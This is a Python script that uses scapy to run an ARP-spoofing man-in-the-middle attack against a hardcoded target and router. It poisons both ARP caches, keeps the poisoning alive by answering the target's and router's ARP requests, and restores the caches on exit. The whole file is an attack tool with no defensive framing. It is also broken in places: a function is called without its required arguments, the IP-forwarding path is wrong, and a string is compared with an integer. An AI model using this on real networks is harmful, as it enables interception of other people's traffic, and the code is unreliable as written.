import scapy.all as scapy
from sys import exit
from time import sleep
import threading

def getMac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
	full = broadcast / arp_request
	answer = scapy.srp(full, timeout = 6, verbose = False)[0]
	return answer[0][1].hwsrc

def spoof(target_ip,target_mac,spoof_ip,attacker_mac=None): # tells target that spoof_ip is at attacker_mac
	if attacker_mac is None:
		packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
	else:
		packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc=attacker_mac)
	
	scapy.send(packet, verbose = False)

def showOptions(mymac,targetip,targetmac,routerip,routermac):
	print("Your MAC:", mymac)
	print("Target IP:", targetip)
	print("Target MAC:",targetmac)
	print("Router IP:", routerip)
	print("Router MAC:", routermac)

def t(pkt):

	if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:

		if pkt.psrc == targetip:
			print(targetip, "is asking for", routerip,", sending spoofed replies...")
			for x in range(10):
				spoof(targetip,targetmac,routerip,mymac)
				sleep(0.5)

		if pkt.psrc == routerip:
			print(routerip, "is asking for", targetip,", sending spoofed replies...")
			for x in range(10):
				spoof(routerip,routermac,targetip,mymac)
				sleep(0.5)

def arp_monitor_callback(pkt):

        threading.Thread(target=t, args=(pkt,)).start()
	

def ipForward():
        ip_forward_path = "/proc/sys/net/ip_forward"
        with open(ip_forward_path) as x:
                if x.read() != 1:
                        with open(ip_forward_path, "w") as y:
                                y.write("1")



mymac = None
targetip = "192.168.1.101"
routerip = "192.168.1.19"

try:
	targetmac = getMac(targetip)
	routermac = getMac(routerip)
except Exception as e:
	print("Couldn't get mac address")
	print(e)
	exit(1)

showOptions()

def run():

	for x in range(5):
		spoof(targetip,targetmac,routerip,mymac) # tells target that you are the router
		spoof(routerip,routermac,targetip,mymac) # tells router that you are the target
		sleep(0.5)

	f = "host {} and host {} and arp".format(targetip,routerip)

	scapy.sniff(prn=arp_monitor_callback, filter=f, store=0)

	print("\nRestoring ARP cache and exiting...")
	spoof(targetip,targetmac,routerip,routermac)
	spoof(routerip,routermac,targetip,targetmac)

		
run()

